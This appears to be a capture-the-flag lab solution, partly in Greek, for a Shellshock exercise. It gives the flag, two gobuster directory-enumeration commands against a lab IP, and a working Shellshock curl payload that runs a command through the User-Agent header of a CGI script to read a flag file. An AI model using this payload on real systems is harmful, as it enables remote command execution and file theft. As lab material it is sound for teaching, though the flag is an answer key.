FLAG{Sh3ll_sh0cker}

Για τις αναγκες της άσκησης, παρέχεται έτοιμο wordlist που μπορεί να βρεθεί και στο εξής url:
https://github.com/v0re/dirb/blob/master/wordlists/small.txt

gobuster : 
1)gobuster -u http://192.168.2.17:5052/ -w /home/wordlist/wordlist.txt
2)gobuster -u http://192.168.2.17:5052/cgi-bin/ -w /home/wordlist/wordlist.txt

shellshock :
curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /home/secret/flag.txt" 192.168.2.17:5052/cgi-bin/secret


CREDITS
https://github.com/0xdevalias/docker-gobuster/blob/master/Dockerfile
